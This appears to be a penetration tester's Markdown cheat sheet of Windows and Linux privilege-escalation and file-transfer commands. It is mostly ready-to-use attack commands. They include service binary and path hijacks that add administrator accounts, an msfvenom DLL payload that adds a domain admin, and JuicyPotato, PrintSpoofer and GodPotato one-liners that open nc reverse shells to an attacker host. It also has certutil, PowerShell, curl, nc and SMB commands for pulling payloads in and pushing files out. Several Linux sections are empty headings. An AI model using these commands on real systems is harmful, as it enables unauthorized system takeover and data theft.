# Privilege Escalation

## Windows

Connect to windows machine:
```
xfreerdp /v:$rhosts /u:username /p:password /drive:.,share
```

Update windows-exploit-suggester:
```
sudo python2.7 windows-exploit-suggester.py --update
```

Using Windows Exploit Suggester
```
python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
```

### Manual

Username:
```
whoami
```
```
Get-LocalUser
```

Groups username is in:
```
whoami /groups
```
```
Get-LocalGroup
```

Get all system users:
```
net user
```

Information about a group:
```
Get-LocalGroupMember GroupName
```

Get password policy:
```
net accounts
```

System Information:
```
systeminfo
```

Get patches and updates:
```
wmic qfe
```

List all network interfaces:
```
ipconfig /all
```

Print routing table:
```
route print
```

List all active network connections:
```
netstat -ano
```

We can query two registry keys756 to list both 32-bit and 64-bit applications in the Windows Registry:

For 32-bit:
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
For 64-bit:
```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Check processes running in machine:
```
Get-Processes
```

Check startup programs:
```
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```



Find some files with extension txt and ini from `C:\`  directory:
```
Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

This one searches for a lot of extentions:
```
Get-ChildItem -Path C:\Users\user\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

Checking ownership of a file:
```
dir /q C:\Path\to\file.ext
```

Read command history:
```
Get-History
```

```
(Get-PSReadlineOption).HistorySavePath
type output
```

Try to run some commands as another user (this on pops another terminal so you show use Windows GUI):
```
runas /user:user cmd
```

Enter as another user:
```
$password = ConvertTo-SecureString "password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("username", $password)
Enter-PSSession -ComputerName ComputerName -Credential $cred
```

Using evil-winrm for remote connection:
```
evil-winrm -i 192.168.50.220 -u username -p "password"
```

### Automated
Using winPEAS
```
.\winPEASx64.exe
```
NOTE: Remember to use the correspondent winPEAS for your local system.
NOTE2: Remember to get another shell (from msfvenom) to use winPEAS, because sometimes your reverse_shell could crash.
NOTE3: Use it from a bash terminal, because it's colors are configured to be seen from a bash terminal.

### Windows Services

Start a service
```
sc start service
```
Stop a service:
```
sc stop service
```

#### Hijack service Binaries

Replace a binary:
```
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

Modify a service binary path:
```
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

#### Hijack service DLLs

Generating a malicious DLL
```
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

#### Abuse Unquoted service paths

Search for unquoted service paths
```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

### Other Components

#### Scheduled Tasks
```
schtasks /query /fo LIST /v
```

```
Get-ScheduledTask | select TaskName,State
```

#### SeImpersonate Privilege

##### [JuicyPotato](https://github.com/ohpe/juicy-potato)
```
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *
```

##### [PrintSpoofer64](https://github.com/itm4n/PrintSpoofer)
From LOCAL/NETWORK SERVICE to SYSTEM by abusing `SeImpersonatePrivilege` on Windows 10 and Server 2016/2019.
```
.\PrintSpoofer64.exe -c "C:\path\to\nc.exe $lhost $lport -e cmd"
```

```
.\PrintSpoofer64.exe -i -c powershell.exe
```

Releases [link](https://github.com/itm4n/PrintSpoofer/releases).

##### [GodPotato](https://github.com/BeichenDream/GodPotato)
Affected version: Windows Server 2012 - Windows Server 2022 and Windows 8 - Windows 11

Reverse shell:
```
.\GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe $lhost $lport"
```

## Linux

### Basic

### Automated
Using linPEAS

### Exposed Confidential Information

### Insecure File Permissions

#### CronJobs

```
cat /etc/crontab
```

Add pspy!
#### Password Authentication

### Insecure System Components

#### Setuid Binaries and Capabilities

#### Kernel Exploits

# Metasploit

# Exfiltration Data

## Windows

CMD
```
certutil -urlcache -split -f http://$lhost:$lport/file.ext file.ext
```

Powershell
```
iwr -uri http://$lhost:$lport/file.ext -OutFile file.ext
(New-Object Net.WebClient).DownloadFile("http://$lhost:$lport/file.ext","C:\path\to\file.ext")
Invoke-WebRequest "http://$lhost:$lport/file.ext" -OutFile "file.ext"
```

### SMB

Copy files from Kali to Windows:
```
copy \\$lhost\sharename\file.ext file.ext
```

Copy file from Windows to Kali:
```
copy file.ext \\$lhost\sharename\file.ext
```


## Linux
S
```
wget http://$lhost:$lport/file.ext
curl http://$lhost:$lport/file.ext -o /path/to/file.ext
```

### SCP

Credits:
[How to Use SCP Command for File Transfer](https://www.hostinger.com/tutorials/using-scp-command-to-transfer-files/#:~:text=SCP%20(secure%20copy%20protocol)%20is,for%20your%20data%20and%20credentials.)

Copying from a local server to a remote host and can use `-r` to copy multiple files or subdirectories:
```
scp -P [-r] 2222 /users/Hostinger/desktop/scp.zip root@191.162.0.2:/writing/article
```

Transferring a Remote File to a Local Machine
```
scp root@191.162.0.2:/writing/articles/SCP.zip Users/Hostinger/Desktop
```

Safely Moving a File Between Remote Hosts
```
scp root@191.162.0.2:/writing/article/scp.zip hostinger@11.10.0.1:/publishing
```

### nc
```
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
### SMB

Via set a smbserver impacket-smbserver:
```
impacket-smbserver -smb2support sharename /path/to/share
```
